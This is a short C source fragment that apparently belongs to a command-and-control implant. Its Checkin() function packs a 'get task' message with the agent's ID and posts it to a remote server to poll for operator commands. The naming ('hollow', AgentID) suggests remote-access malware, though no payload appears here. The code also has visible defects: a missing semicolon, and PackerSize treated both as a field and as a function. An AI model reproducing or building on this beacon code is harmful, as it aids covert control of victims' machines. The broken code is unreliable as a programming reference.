#include "../../includes/core/core.h"
#include "../../includes/byte/byte.h"
#include "../../includes/net/net.h"




BOOL Checkin() {
	if (packager->PackerSize == 0) {
		packager->Pack4(MSG_GET_TASK);
		packager->Pack4(hollow->config->AgentID);
	}

	BOOL ok = g_NetMgr->DoPost(packager->PackerPointer(), (SIZE_T)packager->PackerSize())
	if (!ok) {
		return FALSE;
	}
	packager->ResetPacker();
	return TRUE;
}